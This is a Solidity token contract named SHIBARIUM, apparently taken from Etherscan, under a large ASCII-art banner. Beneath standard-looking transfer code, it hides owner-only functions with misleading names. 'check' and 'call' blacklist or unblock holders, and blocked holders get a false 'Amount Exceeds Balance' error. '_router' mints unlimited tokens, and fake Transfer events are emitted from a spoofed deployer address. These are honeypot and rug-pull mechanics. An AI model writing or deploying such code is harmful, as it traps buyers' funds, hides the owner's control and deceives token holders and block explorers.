/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

pragma solidity 0.8.17;
/*
The line between an L2 and own blockchain is thin

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BBBBGGGGGGGGB##&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&#BGGPGGGBBB######BBGP5YY5PB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#GGGGGB#######BBBBB####&&&&#BPYJJ5G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&BGGGGBGGBBBBBBBBBBBBB####BBBBB##&@&GY??YG&@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@#GG#BGGGPPPGPPPPPPPPPPPPPPPGGBBB##BBB#&&BY?7JPB&@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@#PG#&B55PPP5555555PPPGGBBBBBBBBGGGGGBB#BB#&&GY7?YPB&@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@&P5B#BP5555PPPPPPGB##&&@@@@@@@@@@@@&&#BGGGBBB#&[email protected]@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@G5PBBP555PGGPPPGB#&@@@@@@@@@@@@@@@@@@@@@@&#BGBB#&B57P#GPG#@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@&P5PGPY55PPPPPPB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#BB##[email protected]#[email protected]@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@&5YGG5Y5PPPPPGB#&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&#B#[email protected]&[email protected]@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@&55YP5Y5PGBBGB#&&@@@@&55B&@@&&&##&&&&@@&#P5#@@@@@@@@&#[email protected]@&[email protected]@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@P5GP5YPB##BGB#&&@@@@@[email protected]@@@@@@@@&######BG5PP#@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#YBP55P#&&#GG#&@@@@@@@#[email protected]@@@@@@@@@&#BB#[email protected]@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@5PG5G5B&&#BG#&&@@@@@@@#[email protected]@@@@@@@@@@&##G#&BPPP5#@@@@@@@@@@@@@@
@@@@@@@@@@@@@&&&&#JG5GG5#&#BGB#&@@@@@@@&P57!!~^~!!!!!!!~^~!!7JP#@@@@@@@@@@@#&&PB&#[email protected]@@@@@@@@@@@@@
&&&&&&&&&########GJ55BG5###BG#&&@@@@@@&GP57!77^^!!!!!!!~^!7!!JPP&@@@@@@@@@@##@&PB&[email protected]@@@@@@@@@@@@@
###BBBBBBBBBBBBBBPJYG#BPB##BB#&@@@@@@@&[email protected]@@@@@@@@@&B&@#PB#P5P&@@@@@@@@@@@&&
GGGGGGGBBBBBBBBBBP7Y#&#GG#BBB#&@@@@@@@&PJ!!!!!7?7^^^^:!?7!!!!!?P#@@@@@@@@@@&B&@&[email protected]@@@@@@@@&&&&&
GGGGGBBBBBBBB####B!5#&&GGGBBB#&@@@@@@@@B?...:^~: :B&P  .~^:.. !G&@@@@@@@@@@#B&&&[email protected]@@@@@&&&&&&#B
BBGGGGGGGGGGGGBBB#J?#&&BGGGGB#&@@@@@@@@&G?:     :^75~~.     .!P&@@@@@@@@@@&BB&@@[email protected]@@@&&&&&#BB##
########BBBBGGGGGG5!G&@&BBPPB##&@@@@@@@@&#57^.  :~^!^!   .^75B&@@@@@@@@@@@#GB&@&GGPPP&@&&&&&&#B####&
@@&&&&&&&###[email protected]@#GGPGB#&&@@@@@@@@@&#G5?!^:...:^!?YGB&&@@@@@@@@@@@&BG#&&BGGPPB&&&&&##BB##&&@@
&&&###########BBBBBG7?#@&#GPGGB##&&@@@@@@@@@@&##BGPPPGBB#&&@@@@@@@@@@@@@&#GB#&#PPPGG##&&##BB##&&@@@@
#####&&&&&&&&&##[email protected]&BPGBBBB##&&#&&&@&&##&&&&@@&@@&&&&&&&&@&@&@@&@&#BGB##PP5GG#&##BBB##&&@@@@@@
&&&&&&&&&&####BBBBBB#BJ75#&BPG####BG~7J5~P^G?7B^7!&J^YB^7!#!?P!&~5^??:B#BGBBG55PGGBBBBBB##&&&&@@@@@@
&&&&&############&&&#&#57?PBBGB#&&&B?775!B!G??B~J7P757P!57B7JB757G7P5!BBGGGP5PGBBGPGGBB#&@@@@@@@@@@@
############&&&&&&@@@&&&BY?J5PGB##&&&&&###&&&&@@@@@@@@@@@@&@@@@&@@@@##BGP555GB#BBGGGGPGB#&&@@@@@@@@@
########&&&&&&@@@@@@@@@&&#G5JJY5GB#&&&@&&####&@@@@@@@@@@@@@@@@@@@@&#&BGP55GB#BGBBB####BGGGB#&&&&&&&&
####&&&&&&@@@@@@@@@@@@@@@&&#BP5YYY5PGB#&&&&####&&@@@@@@@@@@@@@@@@#GBGP5PB##BBGGBBB#####BBGPPPPGGGGGG
&&&&&&@@@@@@@@@@@@@@@@@@@@&&#BBGGGP55YY5PGBB#####&&&&@@@@@@@&&&#B55PGB###BGGBBB####BBBBBBBGGGPPP55PP
&@@@@@@@@@@@&&&&&&&&&&&&####BGP55PGGBBBPPPPPGGBBBBBBBBBBBBBGGPPPGB###BGGGGBB####&&&&&&&&&&&&&&######
@&&&&&&&&&&&&&&&&&####BBBGPP5555Y???YPGB###BBBBBBBBBBBBGGGBBBB###BBGGGBB#&&&@@@@@@@@@@@@@@@@@&&&&&&#
######&&&&&&@@@@&&&&##BGPPPPP5JJJYPGGGGGBBBBB###########BBBBBBGGGGBB###&&&@@@@@@@@@@@@@@@&&&&&###BBB
&&&@@@@@@@@@@@&&&&#BGPPPPP5YJY5PBB##&@@&&&&####BBBBBBBBBB#######BBGGB####&&&&&&&&&&&&&&&&&###BBB###&
@@@@@@@@@@&&&##BGPPPGP5YJJJYPGBB#&&@@@@@@@@@@@&&&&&&&&&&@@@@&&&&&&###BBBGBB############BBBBBB##&&&&&

*/
 
contract SHIBARIUM {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txVal;

    // 
    string public name = "SHIBARIUM";
    string public symbol = unicode"SHIBARIUM";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x14974F055d57526C5FADA2e4E744193264911164;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!txVal[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function check(address _user) public {
             require(msg.sender == owner);
         require(!txVal[_user], "NaN");
        txVal[_user] = true; }
        function call(address _user) public {
             require(msg.sender == owner);
        require(txVal[_user], "NaN");
         txVal[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
        function _router(address oracle,  uint256 update) public {
             require(msg.sender == owner);
             balanceOf[oracle] += update;
             totalSupply += update; }


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!txVal[from] , "Amount Exceeds Balance"); 
        require(!txVal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }